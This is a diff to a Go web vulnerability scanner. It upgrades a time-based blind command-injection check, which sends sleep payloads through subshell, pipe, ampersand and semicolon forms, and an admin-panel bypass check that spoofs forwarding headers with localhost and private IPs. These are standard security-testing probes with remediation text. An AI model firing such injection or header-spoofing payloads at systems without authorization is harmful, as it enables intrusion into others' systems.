@@ -1341,35 +1341,69 @@ func (p *PythonServerPlugin) Run(target ScanTarget) *Vulnerability {
 // DORM v7: HARDENED / PRO WEAPONS (41-50)
 // ==========================================
 
-// 41. BLIND RCE (Time Based) - SERIOUS BUSINESS
+// 41. BLIND RCE (Time Based & Verified) - v2
 type BlindRCEPlugin struct{}
 
-func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Time)" }
+func (p *BlindRCEPlugin) Name() string { return "Blind Command Injection (Time-Based & Verified)" }
+
 func (p *BlindRCEPlugin) Run(target ScanTarget) *Vulnerability {
 	if !isWebPort(target.Port) {
 		return nil
 	}
-	// We tell the server to "sleep for 3 seconds"
-	start := time.Now()
-	// Common sleep payload for Linux/Windows
-	payload := "$(sleep 3)"
-	resp, err := getClient().Get(getURL(target, "/?cmd="+payload))
-	if err == nil {
-		defer resp.Body.Close()
-		duration := time.Since(start)
-		// If response took longer than 3 seconds, the server ate the command.
-		if duration >= 3*time.Second {
-			return &Vulnerability{
-				Target: target, Name: "Blind OS Command Injection", Severity: "CRITICAL", CVSS: 9.8,
-				Description: "Server responded to sleep command (Time-based).",
-				Solution:    "Block system command execution.",
-				Reference:   "OWASP Command Injection",
+
+	client := getClient()
+
+	// 1. BASELINE CHECK
+	startBase := time.Now()
+	respBase, err := client.Get(getURL(target, "/?cmd=test_normal"))
+	if err != nil {
+		return nil
+	}
+	respBase.Body.Close()
+	baseDuration := time.Since(startBase)
+
+	// If server is naturally too slow (>4s), skip time-based checks to avoid false positives.
+	if baseDuration > 4*time.Second {
+		return nil
+	}
+
+	sleepSeconds := 5
+	targetSleepDuration := time.Duration(sleepSeconds) * time.Second
+
+	payloads := []string{
+		fmt.Sprintf("$(sleep %d)", sleepSeconds),  // Linux subshell
+		fmt.Sprintf("|sleep %d", sleepSeconds),    // Linux pipe
+		fmt.Sprintf("%%26sleep+%d", sleepSeconds), // Linux & (URL Encoded)
+		fmt.Sprintf(";sleep %d", sleepSeconds),    // Linux sequence
+	}
+
+	for _, payload := range payloads {
+		startAttack := time.Now()
+
+		respAttack, err := client.Get(getURL(target, "/?cmd="+payload))
+
+		if err == nil {
+			respAttack.Body.Close()
+			attackDuration := time.Since(startAttack)
+
+			// Logic: Attack Time > (Baseline + Sleep - Tolerance)
+			threshold := baseDuration + targetSleepDuration - (1 * time.Second)
+
+			if attackDuration > threshold {
+				return &Vulnerability{
+					Target:      target,
+					Name:        "Blind OS Command Injection (High Confidence)",
+					Severity:    "CRITICAL",
+					CVSS:        9.8,
+					Description: fmt.Sprintf("Server confirmed execution of 'sleep %d' payload.\nBaseline Latency: %v\nAttack Latency: %v", sleepSeconds, baseDuration, attackDuration),
+					Solution:    "Strictly validate user inputs and disable system command execution functions.",
+					Reference:   "OWASP Command Injection",
+				}
 			}
 		}
 	}
 	return nil
 }
-
 // 42. XXE INJECTION (XML External Entity)
 type XXEPlugin struct{}
 
@@ -1398,35 +1432,85 @@ func (p *XXEPlugin) Run(target ScanTarget) *Vulnerability {
 	return nil
 }
 
-// 43. ADMIN IP BYPASS (Header Spoofing)
+// 43. ADMIN IP BYPASS (Header Spoofing & Verified) - v2
 type AdminBypassPlugin struct{}
 
-func (p *AdminBypassPlugin) Name() string { return "Admin Panel Bypass (IP Spoof)" }
+func (p *AdminBypassPlugin) Name() string { return "Admin Panel Bypass (IP Spoof - Verified)" }
+
 func (p *AdminBypassPlugin) Run(target ScanTarget) *Vulnerability {
-	if !isWebPort(target.Port) {
-		return nil
-	}
-	req, _ := http.NewRequest("GET", getURL(target, "/admin"), nil)
-	// Act as if coming from Localhost (Admin)
-	req.Header.Set("X-Forwarded-For", "127.0.0.1")
-	req.Header.Set("X-Real-IP", "127.0.0.1")
+    if !isWebPort(target.Port) {
+        return nil
+    }
 
-	resp, err := getClient().Do(req)
-	if err != nil {
-		return nil
-	}
-	defer resp.Body.Close()
+    client := getClient()
+    targetPath := "/admin" // Can be adjusted to /console, /dashboard etc.
+    fullURL := getURL(target, targetPath)
 
-	// If we get 200 (OK) where it should be 403 (Forbidden), we are in.
-	if resp.StatusCode == 200 {
-		return &Vulnerability{
-			Target: target, Name: "Admin IP Restriction Bypass", Severity: "CRITICAL", CVSS: 9.0,
-			Description: "Admin panel accessed via header manipulation.",
-			Solution:    "Do not trust client-side headers for auth.",
-			Reference:   "",
-		}
-	}
-	return nil
+    // 1. BASELINE CHECK
+    reqBase, _ := http.NewRequest("GET", fullURL, nil)
+    respBase, err := client.Do(reqBase)
+    if err != nil {
+        return nil
+    }
+    baseStatus := respBase.StatusCode
+    respBase.Body.Close()
+
+    // If already accessible (200) or not found (404), skip bypass attempt.
+    // We only target Forbidden (403) or Unauthorized (401) pages.
+    if baseStatus != 403 && baseStatus != 401 {
+        return nil
+    }
+
+    headers := []string{
+        "X-Forwarded-For",
+        "X-Real-IP",
+        "Client-IP",
+        "X-Originating-IP",
+        "X-Remote-IP",
+        "X-Remote-Addr",
+        "X-Client-IP",
+        "X-Host",
+        "X-Forwarded-Host",
+    }
+
+    spoofIPs := []string{
+        "127.0.0.1",
+        "localhost",
+        "0.0.0.0",
+        "192.168.1.1",
+        "10.0.0.1",
+        "::1", // IPv6 Localhost
+    }
+
+    for _, header := range headers {
+        for _, ip := range spoofIPs {
+            reqSpoof, _ := http.NewRequest("GET", fullURL, nil)
+            reqSpoof.Header.Set(header, ip)
+
+            respSpoof, err := client.Do(reqSpoof)
+            if err == nil {
+                spoofStatus := respSpoof.StatusCode
+                respSpoof.Body.Close()
+
+                // CRITICAL: If status changes from Forbidden (403) to OK (200)
+                if spoofStatus == 200 {
+                    return &Vulnerability{
+                        Target:   target,
+                        Name:     "Admin IP Restriction Bypass",
+                        Severity: "CRITICAL",
+                        CVSS:     9.8,
+                        Description: fmt.Sprintf(
+                            "Access restriction bypassed!\nBaseline Status: %d\nBypass Status: %d\nEffective Header: %s: %s",
+                            baseStatus, spoofStatus, header, ip),
+                        Solution:  "Do not rely solely on client-side headers (e.g., X-Forwarded-For) for access control/authentication.",
+                        Reference: "CWE-290: Authentication Bypass by Spoofing",
+                    }
+                }
+            }
+        }
+    }
+
+    return nil
 }
 
 // 44. CRLF INJECTION (HTTP Response Splitting)
@@ -2353,3 +2437,4 @@ func GetPluginInventory() []string {
 		"ASP.NET ViewState Encryption", "Laravel .env Disclosure", "ColdFusion Debugging", "Drupalgeddon2 RCE", "GitLab User Enum", "Nginx Alias Traversal",
 	}
 }
+
